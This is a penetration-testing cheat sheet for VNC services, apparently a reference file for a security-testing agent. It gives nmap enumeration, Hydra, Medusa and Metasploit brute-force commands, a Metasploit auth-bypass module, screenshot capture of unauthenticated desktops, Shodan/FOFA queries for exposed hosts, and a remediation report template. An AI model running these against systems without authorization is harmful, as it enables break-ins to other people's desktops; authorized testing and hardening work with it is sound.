# VNC — Exploitation & Enumeration

## Overview
VNC (Virtual Network Computing) uses the RFB protocol (default ports 5900-5910).
Common misconfigurations: no auth, weak password, no encryption.

## Enumeration

```bash
# Port scan for VNC
nmap -sV -p 5900-5910 TARGET

# Full VNC script scan
nmap -sV --script vnc-info,vnc-brute,vnc-title -p 5900-5910 TARGET

# Service detection
nmap -sV -p 5900 --version-intensity 9 TARGET
```

## Authentication Check

```bash
# Check auth type (0=None, 1=VNC Auth, 16=Tight, 18=TLS)
nmap --script vnc-info -p 5900 TARGET

# No-auth VNC (auth type 1 with no password required)
vncviewer TARGET:5900
```

## Brute Force

```bash
# Hydra VNC brute
hydra -P /usr/share/wordlists/rockyou.txt vnc://TARGET -t 4

# Medusa
medusa -h TARGET -p 5900 -P /usr/share/wordlists/rockyou.txt -M vnc

# Metasploit
msfconsole -q -x "use auxiliary/scanner/vnc/vnc_login; set RHOSTS TARGET; set PASS_FILE /usr/share/wordlists/rockyou.txt; run"
```

## Known Vulnerabilities

### CVE-2006-2369 (RealVNC 4.1.1 Auth Bypass)
```bash
# Auth type 1 can be forced to bypass authentication
# Metasploit
use auxiliary/scanner/vnc/vnc_none_auth
set RHOSTS TARGET
run
```

### LibVNCServer Vulnerabilities
```bash
# CVE-2018-7225, CVE-2019-15681 (buffer overflow)
searchsploit libvncserver
```

## Screenshot & Access

```bash
# Screenshot without password (no-auth VNC)
vncsnapshot -passwd /dev/null TARGET:0 /workspace/output/vnc_screenshot.jpg

# Screenshot with password
vncsnapshot -passwd <(echo "PASSWORD") TARGET:0 /workspace/output/vnc_screenshot.jpg

# x11vnc connect
vncviewer TARGET::5900

# Via SSH tunnel (if SSH available)
ssh -L 5901:127.0.0.1:5900 user@TARGET -N &
vncviewer 127.0.0.1:5901
```

## Shodan / FOFA Queries

```
# Shodan
port:5900 "RFB 003.008"
product:"VNC"

# FOFA
protocol="rfb"
```

## Report Template
```
Vulnerability: Exposed VNC Service / Weak VNC Authentication
Port: 5900/tcp
Auth Type: [None | VNC Password | NLA]
Impact: [Unauthenticated Desktop Access | Brute-forceable | MitM-able (no TLS)]
Evidence: [Screenshot of desktop / successful login]
Remediation:
  - Restrict VNC to localhost, access via SSH tunnel only
  - Enable NLA/TLS authentication
  - Use strong, unique password (>12 chars)
  - Firewall port 5900 from public internet
```

indicators: vnc rfb protocol virtual network computing
